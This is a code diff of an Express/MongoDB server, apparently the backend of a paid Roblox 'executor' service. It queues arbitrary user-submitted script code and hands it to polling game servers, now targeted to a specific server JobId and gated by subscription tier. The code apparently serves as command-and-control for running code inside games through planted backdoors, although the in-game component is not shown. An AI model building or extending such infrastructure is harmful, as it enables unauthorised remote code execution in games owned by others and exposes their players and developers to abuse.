@@ -36,6 +36,7 @@ const tokenSchema = new mongoose.Schema({
 const commandSchema = new mongoose.Schema({
     id:          { type: String, required: true },
     placeId:     String,
+    jobId:       String,
     action:      { type: String, default: "execute" },
     targetUsername: String,
     code:        String,
@@ -49,6 +50,7 @@ const playerStatusSchema = new mongoose.Schema({
     displayName:    String,
     userId:         Number,
     placeId:        String,
+    jobId:          String,
     gameName:       String,
     online:         { type: Boolean, default: false },
     lastSeen:       { type: Date, default: Date.now }
@@ -118,63 +120,9 @@ function trackingPayload(user, status) {
         robloxUsername: user.robloxUsername || "",
         online: !!(status?.online && isFresh),
         placeId: status?.placeId || "",
+        jobId: status?.jobId || "",
         gameName: status?.gameName || "",
         lastSeen
-    };
-}
-
-async function fetchRobloxJson(url) {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 8000);
-    try {
-        const response = await fetch(url, {
-            headers: { "User-Agent": "Vantix/1.0" },
-            signal: controller.signal
-        });
-        if (!response.ok) return null;
-        return await response.json();
-    } catch {
-        return null;
-    } finally {
-        clearTimeout(timeout);
-    }
-}
-
-async function resolveRobloxGameInfo(placeId, fallback = {}) {
-    const cleanPlaceId = String(placeId || "").trim();
-    let name = String(fallback.name || "").trim();
-    let creator = String(fallback.creator || "").trim();
-    let players = Number(fallback.players) || 0;
-    let icon = String(fallback.icon || "").trim();
-    let universeId = "";
-
-    const universeData = await fetchRobloxJson(`https://apis.roblox.com/universes/v1/places/${encodeURIComponent(cleanPlaceId)}/universe`);
-    universeId = String(universeData?.universeId || "");
-
-    if (universeId) {
-        const gameData = await fetchRobloxJson(`https://games.roblox.com/v1/games?universeIds=${encodeURIComponent(universeId)}`);
-        const info = gameData?.data?.[0];
-        if (info) {
-            if (info.name) name = info.name;
-            if (info.creator?.name) creator = info.creator.name;
-            if (Number.isFinite(Number(info.playing))) players = Number(info.playing);
-        }
-
-        const iconData = await fetchRobloxJson(`https://thumbnails.roblox.com/v1/games/icons?universeIds=${encodeURIComponent(universeId)}&size=512x512&format=Png&isCircular=false`);
-        icon = iconData?.data?.[0]?.imageUrl || icon;
-    }
-
-    if (!icon) {
-        const placeIconData = await fetchRobloxJson(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${encodeURIComponent(cleanPlaceId)}&size=512x512&format=Png&isCircular=false`);
-        icon = placeIconData?.data?.[0]?.imageUrl || "";
-    }
-
-    return {
-        name: name && name.toLowerCase() !== "game" ? name : "Unknown Game",
-        creator: creator || "Unknown",
-        players,
-        icon,
-        universeId
     };
 }
 
@@ -311,23 +259,19 @@ app.post("/api/update", async (req, res) => {
     try {
         const { placeId, players, name, creator, earlyAccess } = req.body;
         if (!placeId) return res.json({ ok: false });
-        const existing = await Game.findOne({ placeId });
-        const info = await resolveRobloxGameInfo(placeId, {
-            name,
-            creator,
-            players,
-            icon: existing?.icon || ""
-        });
+        let icon = "";
+        try {
+            const r = await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&size=512x512&format=Png`);
+            const d = await r.json();
+            icon = d?.data?.[0]?.imageUrl || "";
+        } catch {}
         await Game.findOneAndUpdate(
             { placeId },
-            { placeId, players: info.players, name: info.name, creator: info.creator, icon: info.icon, earlyAccess: earlyAccess === true || earlyAccess === "true", updated: new Date() },
+            { placeId, players: Number(players) || 0, name: name || "Unknown", creator: creator || "Unknown", icon, earlyAccess: earlyAccess === true || earlyAccess === "true", updated: new Date() },
             { upsert: true, new: true }
         );
         res.json({ ok: true });
-    } catch (e) {
-        console.error("Update error:", e.message);
-        res.json({ ok: false });
-    }
+    } catch (e) { res.json({ ok: false }); }
 });
 
 // VALIDATE TOKEN
@@ -366,6 +310,7 @@ app.post("/api/player-status", async (req, res) => {
                 displayName: req.body.displayName || "",
                 userId: Number(req.body.userId) || 0,
                 placeId: String(req.body.placeId || ""),
+                jobId: String(req.body.jobId || ""),
                 gameName: String(req.body.gameName || ""),
                 online: req.body.online === true || req.body.online === "true",
                 lastSeen: new Date()
@@ -382,19 +327,13 @@ app.post("/api/player-status", async (req, res) => {
 app.post("/api/execute", requireLogin, async (req, res) => {
     try {
         const { placeId, code } = req.body;
-        if (!placeId || !code) return res.json({ ok: false });
-        const id = uuidv4();
-        await Command.create({ id, placeId, code, status: "pending", requestedBy: req.session.username });
-        res.json({ ok: true, id });
-    } catch { res.json({ ok: false }); }
-});
-
-app.post("/api/give-gui", requireLogin, async (req, res) => {
-    try {
-        const { placeId } = req.body;
-        if (!placeId) return res.json({ ok: false, error: "Missing placeId" });
+        if (!placeId || !String(code || "").trim()) return res.json({ ok: false, error: "Missing script" });
         const user = await User.findOne({ username: req.session.username });
         if (!user) return res.json({ ok: false, error: "User not found" });
+        const allowed = await gamesForTier(user.tier);
+        if (!allowed.find(g => String(g.placeId) === String(placeId)))
+            return res.json({ ok: false, error: "Your tier does not include this game" });
+
         const robloxUsername = cleanRobloxUsername(user.robloxUsername);
         if (!robloxUsername) return res.json({ ok: false, error: "Set your Roblox username in the Tracking tab first" });
 
@@ -405,28 +344,25 @@ app.post("/api/give-gui", requireLogin, async (req, res) => {
             return res.json({ ok: false, error: `${robloxUsername} is not online in a connected game right now` });
         if (String(status.placeId) !== String(placeId))
             return res.json({ ok: false, error: `${robloxUsername} is online, but not in this game` });
+        if (!status.jobId)
+            return res.json({ ok: false, error: "Tracked server has not reported a JobId yet" });
 
         const id = uuidv4();
-        await Command.create({
-            id,
-            placeId,
-            action: "giveGui",
-            targetUsername: robloxUsername,
-            status: "pending",
-            requestedBy: req.session.username
-        });
-        res.json({ ok: true, id, username: robloxUsername });
+        await Command.create({ id, placeId, targetUsername: robloxUsername, code, status: "pending", requestedBy: req.session.username });
+        await Command.updateOne({ id, placeId }, { jobId: status.jobId });
+        res.json({ ok: true, id });
     } catch (e) {
-        res.json({ ok: false, error: "Could not send GUI command" });
+        res.json({ ok: false, error: "Could not send execute command" });
     }
 });
 
 app.get("/api/poll", async (req, res) => {
     try {
-        const { placeId } = req.query;
+        const { placeId, jobId } = req.query;
         if (!placeId) return res.json({ commands: [] });
-        const cmds = await Command.find({ placeId, status: "pending" });
-        await Command.updateMany({ placeId, status: "pending" }, { status: "sent" });
+        const query = { placeId, status: "pending", $or: [{ jobId: String(jobId || "") }, { jobId: { $exists: false } }, { jobId: "" }] };
+        const cmds = await Command.find(query);
+        await Command.updateMany({ _id: { $in: cmds.map(c => c._id) } }, { status: "sent" });
         res.json({ commands: cmds.map(c => ({ id: c.id, action: c.action || "execute", code: c.code, targetUsername: c.targetUsername })) });
     } catch { res.json({ commands: [] }); }
 });
